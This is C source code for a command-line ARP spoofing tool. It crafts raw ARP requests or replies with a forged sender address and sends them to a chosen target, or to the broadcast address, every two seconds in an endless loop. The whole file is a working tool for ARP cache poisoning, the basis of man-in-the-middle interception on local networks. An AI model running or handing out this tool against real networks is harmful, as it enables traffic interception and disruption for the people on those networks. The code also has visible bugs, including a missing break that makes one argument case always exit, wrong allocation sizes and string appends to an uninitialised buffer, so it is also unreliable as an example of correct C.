/**********************************************************************
*   Arpspoof Tool
*   Written by Sidney RDC, 2015.
*   Last Change: 2015 Mai 02 18:31:15
***********************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <netdb.h>
#include <sys/ioctl.h>

// Get device mac address
void get_mac(short *mac, char *dev) {
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    int i;

    strcpy(s.ifr_name, dev);
    if(0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for(i = 0; i < 6; i++) {
            mac[i] = (unsigned char) s.ifr_addr.sa_data[i];
        }
    }

    close(fd);
}

// Send arp msg to target
void send_arp_msg(const char *SRC_IP, const short SRC_MAC[], const char *TARGET_IP, const short TARGET_MAC[], const char *dev, const short mode) {
    struct ether_header *eth_hdr;
    struct ether_arp *arp;
    struct in_addr inadd_sender;
    struct in_addr inadd_target;
    struct sockaddr sa;
    int fd;
    char datagram[60];

    eth_hdr = (struct ether_header*) datagram;
    memset(datagram, 0, sizeof(datagram));

    // Set the ethernet header
    eth_hdr->ether_dhost[0] = TARGET_MAC[0];
    eth_hdr->ether_dhost[1] = TARGET_MAC[1];
    eth_hdr->ether_dhost[2] = TARGET_MAC[2];
    eth_hdr->ether_dhost[3] = TARGET_MAC[3];
    eth_hdr->ether_dhost[4] = TARGET_MAC[4];
    eth_hdr->ether_dhost[5] = TARGET_MAC[5];
    eth_hdr->ether_shost[0] = SRC_MAC[0];
    eth_hdr->ether_shost[1] = SRC_MAC[1];
    eth_hdr->ether_shost[2] = SRC_MAC[2];
    eth_hdr->ether_shost[3] = SRC_MAC[3];
    eth_hdr->ether_shost[4] = SRC_MAC[4];
    eth_hdr->ether_shost[5] = SRC_MAC[5];
    eth_hdr->ether_type = htons(ETHERTYPE_ARP);

    // Set the arp header
    arp = (struct ether_arp*) (datagram + sizeof(struct ether_header));
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = 6;
    arp->arp_pln = 4;
    arp->arp_op = htons(mode);

    // Arp body
    // Sender MAC and IP
    memcpy((void*) arp->arp_sha, (void*) eth_hdr->ether_shost, 6);
    inet_aton(SRC_IP, &inadd_sender);
    memcpy((void*) arp->arp_spa, (void*) &inadd_sender, 4);

    // Target MAC and IP
    memcpy((void*) arp->arp_tha, (void*) eth_hdr->ether_dhost, 6);
    inet_aton(TARGET_IP, &inadd_target);
    memcpy((void*) arp->arp_tpa, (void*) &inadd_target, 4);

    // Establish socket
    fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
    if (fd < 0) {
        perror("socket");
        exit(-1);
    }

    strcpy(sa.sa_data, dev);
    sendto(fd, datagram, sizeof(datagram), 0, &sa, sizeof(sa));

    close(fd);
}

// Split a string by a delimitator
char** str_split(char *str, const char a_delim) {
    char s_delim[2];
    char *tmp = str;
    char *token = 0;
    char **out = 0;
    unsigned int count = 0;

    // Convert char delimitator to string delimitator
    s_delim[0] = a_delim;
    s_delim[1] = 0;

    // Count number of separators
    while(*tmp) {
        if(a_delim == *tmp) count++;
        tmp++;
    }

    // Allocate space to output
    out = malloc(sizeof(char*) * count+1);

    // Reset count
    count = 0;

    // Allocate new space to temporary string
    tmp = malloc(sizeof(char*) * strlen(str));

    // Copy memory from input string to temporary string
    strcpy(tmp,str);

    // Extract all elements
    while((token = strsep(&tmp, s_delim)) != NULL) {
        out[count++] = token;
    }

    return out;
}

// Verify if a string array has a string element
char check_str_array(char **array, char *elem, int *index) {
    unsigned int count = 0;

    while(*array) {
        *index = count;

        if(!strcmp(*array,elem)) return 1;

        array++;
        count++;
    }

    *index = 0;

    return 0;
}

// Get broadcast address to a host ip
char* get_broadcast(char *host_ip) {
    // Split host ip address
    char **tmp = str_split(host_ip,'.');

    // Allocate memory to default target ip
    char *b_ip = malloc(sizeof(char*) * (strlen(tmp[0]) + strlen(tmp[1]) + strlen(tmp[2]) + 3));

    // Fill target ip with ip_host + 255
    while(*tmp) {
        strcat(b_ip,*tmp);
        strcat(b_ip,".");
        tmp++;
        if(*(tmp+1) == 0) break;
    }

    // Add to end of b_ip the 255
    strcat(b_ip,"255");

    return b_ip;
}

// Turn mac address from string to short array
void mac2short(char *s_mac, short i_mac[]) {
    char **a_mac = 0;
    unsigned int count = 0;

    // Get target mac
    a_mac = str_split(s_mac,':');

    // Convert target mac to short
    while(*a_mac) {
        i_mac[count] = (unsigned char) strtol(*a_mac, NULL, 16);
        count++;
        a_mac++;
    }
}

// Show error message and exit
void err() {
    printf("Version: 1.0 by Stryker Master\n");
    printf("Usage: arpspoof [-i interface] [-t target_ip target_mac] [-r] [-m op_mode] host_ip\n");
    exit(1);
}

int main(int argc, char **argv) {
    short src_mac[6], target_mac[6];
    short op_mode = 1;
    char op_retr = 0;
    char *param = 0;
    char *src_dev = 0;
    char *target_ip = 0;
    char *host_ip = 0;
    int index = 0, count = 0;
    double packet_seq = 0;

    // Default addresses
    src_dev = "eth0";
    target_mac[0] = 0xFF;
    target_mac[1] = 0xFF;
    target_mac[2] = 0xFF;
    target_mac[3] = 0xFF;
    target_mac[4] = 0xFF;
    target_mac[5] = 0xFF;

    // Verify arguments
    switch(argc) {
        case 2:
            if(check_str_array(argv,"-i",&index) ||
               check_str_array(argv,"-t",&index) ||
               check_str_array(argv,"-r",&index) ||
               check_str_array(argv,"-m",&index)) err();

            break;
        case 4:
             if(check_str_array(argv,"-t",&index) ||
                check_str_array(argv,"-r",&index) ||
              (!check_str_array(argv,"-i",&index) &&
               !check_str_array(argv,"-m",&index))) err();

             break;
        case 5:
             if(check_str_array(argv,"-i",&index) ||
                check_str_array(argv,"-r",&index) ||
                check_str_array(argv,"-m",&index) ||
               !check_str_array(argv,"-t",&index)) err();

             break;
        case 6:
             if((check_str_array(argv,"-i",&index) ^
                 check_str_array(argv,"-m",&index)) ||
                (check_str_array(argv,"-t",&index) ^
                 check_str_array(argv,"-r",&index))) err();

             break;
        case 7:
             if((check_str_array(argv,"-i",&index) &&
                 check_str_array(argv,"-m",&index)) ||
                 check_str_array(argv,"-r",&index) ||
                !check_str_array(argv,"-t",&index)) err();

             break;
        case 8:
             if(!check_str_array(argv,"-i",&index) ||
                !check_str_array(argv,"-t",&index) ||
                !check_str_array(argv,"-r",&index) ||
                 check_str_array(argv,"-m",&index)) err();

             break;
        case 9:
             if(!check_str_array(argv,"-i",&index) ||
                !check_str_array(argv,"-t",&index) ||
                 check_str_array(argv,"-r",&index) ||
                !check_str_array(argv,"-m",&index)) err();

             break;
        case 10:
             if(!check_str_array(argv,"-i",&index) ||
                !check_str_array(argv,"-t",&index) ||
                !check_str_array(argv,"-r",&index) ||
                !check_str_array(argv,"-m",&index)) err();

        default:
             err();
    }

    // Parameters indicator
    param = malloc(sizeof(char*) * argc);

    // The first parameter is the program name
    param[0] = 1;

    // Get interface
    if(check_str_array(argv,"-i",&index)) {
        src_dev = argv[index+1];
        param[index] = 1;
        param[index+1] = 1;
    }

    // Get operation mode
    if(check_str_array(argv,"-m",&index)) {
        op_mode = atoi(argv[index+1]);
        param[index] = 1;
        param[index+1] = 1;
    }

    // Get retransmission mode
    if(check_str_array(argv,"-r",&index)) {
        op_retr = 1;
        param[index] = 1;
    }

    // Get target
    if(check_str_array(argv,"-t",&index)) {
        // Get target ip
        target_ip = argv[index+1];

        // Get target mac
        mac2short(argv[index+2],target_mac);

        // Set used parameters
        param[index] = 1;
        param[index+1] = 1;
        param[index+2] = 1;
    }

    // Get host ip
    for(count = 0; count < argc; count++) {
        if(param[count] == 0) host_ip = argv[count];
    }

    // Set default target ip
    if(!check_str_array(argv,"-t",&index)) target_ip = get_broadcast(host_ip);

    // Get network mac address
    get_mac(src_mac,src_dev);

    // Send arp msgs forever
    while(1) {
        // Show information according with operational mode
        if(op_mode == 1) {
            if(!strcmp(target_ip,host_ip)) {
                printf("%02x:%02x:%02x:%02x:%02x:%02x to %02x:%02x:%02x:%02x:%02x:%02x (%s) :::: arp request=%.0f : gratuitous ARP for %s\n",
                       src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5],
                       target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5],target_ip,
                       packet_seq,target_ip);
            } else {
                printf("%02x:%02x:%02x:%02x:%02x:%02x to %02x:%02x:%02x:%02x:%02x:%02x (%s) :::: arp request=%.0f : who has %s? (as %s)\n",
                       src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5],
                       target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5],target_ip,
                       packet_seq,target_ip,host_ip);
            }
        } else if(op_mode == 2) {
            printf("%02x:%02x:%02x:%02x:%02x:%02x to %02x:%02x:%02x:%02x:%02x:%02x (%s) :::: arp reply=%.0f : %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
                   src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5],
                   target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5],target_ip,
                   packet_seq,host_ip,src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);
        }

        // Send arp package
        send_arp_msg(host_ip,src_mac,target_ip,target_mac,src_dev,op_mode);

        // Increment packet sequence
        packet_seq++;

        // Sleep a time
        sleep(2);
    }

    return 0;
}

